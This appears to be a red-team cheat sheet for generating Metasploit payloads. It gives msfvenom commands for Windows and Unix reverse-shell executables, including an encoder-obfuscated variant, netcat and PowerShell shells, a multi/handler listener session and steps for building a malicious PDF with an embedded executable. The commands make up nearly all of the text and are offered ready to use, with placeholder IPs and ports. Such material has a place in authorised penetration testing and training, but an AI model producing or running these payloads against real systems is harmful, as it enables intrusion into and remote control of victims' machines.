### [Payload Resources]
https://netsec.ws/?p=331  
https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/  
https://github.com/nccgroup/Winpayloads  
https://github.com/swisskyrepo/PayloadsAllTheThings  
https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom  
https://www.offensive-security.com/metasploit-unleashed/fun-incognito/  
https://www.offensive-security.com/metasploit-unleashed/msfvenom/  

# [Generating Payloads on Windows using Metasploit]

### [Regular Reverse TCP]
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe > shell.exe
[Poly Morphic Reverse TCP]
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -e x64/shikata_ga_nai -i 100 -f exe > file.exe

Creating a reverse tcp netcat comamnd
msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<port> R

msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > revshell.exe
```

### [Unique Reverse TCP]
```
msfvenom -p windows/powershell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > pshell.exe
```

### [Handler]
msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

PAYLOAD => windows/x64/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set LHOST eth0

LHOST => tun0

msf5 exploit(multi/handler) > set LPORT 32119

LPORT => 32119

msf5 exploit(multi/handler) > run

### [PDF]
```
Creating malicious PDF
use exploit/windows/fileformat/adobe_pdf_embedded_exe

set payload windows/meterpreter/reverse_tcp
set INFILENAME x.pdf
set FILENAME x.pdf
exploit
```
### [xls Macros]
https://www.manitonetworks.com/security/2016/8/15/macro-payloads-in-excel-with-metasploit  

### [xls XXE]
https://www.youtube.com/watch?v=LZUlw8hHp44  

